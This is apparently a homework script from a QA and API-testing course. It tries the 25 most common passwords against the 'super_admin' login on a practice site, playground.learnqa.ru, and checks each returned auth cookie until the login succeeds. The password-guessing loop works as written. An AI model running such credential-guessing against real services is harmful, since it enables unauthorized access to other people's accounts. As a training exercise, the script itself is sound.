import requests
import sys
import io

# Принудительно устанавливаем UTF-8 для вывода в консоль Windows
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

# Список топ-25 паролей по версии SplashData (из Википедии)
passwords = [
    "123456", "password", "123456789", "12345", "12345678",
    "qwerty", "abc123", "1234567", "password1", "123123",
    "111111", "iloveyou", "admin", "qwerty123", "letmein",
    "welcome", "monkey", "dragon", "master", "football",
    "shadow", "sunshine", "princess", "trustno1", "1234"
]

login = "super_admin"
url_auth = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

found_password = None

for pwd in passwords:
    print(f"Пробуем пароль: {pwd}")
    
    response_auth = requests.post(url_auth, data={"login": login, "password": pwd})
    auth_cookie = response_auth.cookies.get("auth_cookie")
    
    if not auth_cookie:
        print("  Не удалось получить cookie, пропускаем")
        continue
    
    response_check = requests.get(url_check, cookies={"auth_cookie": auth_cookie})
    result = response_check.text
    
    if "You are authorized" in result:
        found_password = pwd
        print(f"\n✅ Пароль найден: {pwd}")
        print(f"   Ответ сервера: {result}")
        break
    else:
        print(f"  Неверный пароль: {result}")

if not found_password:
    print("Пароль не найден в списке.")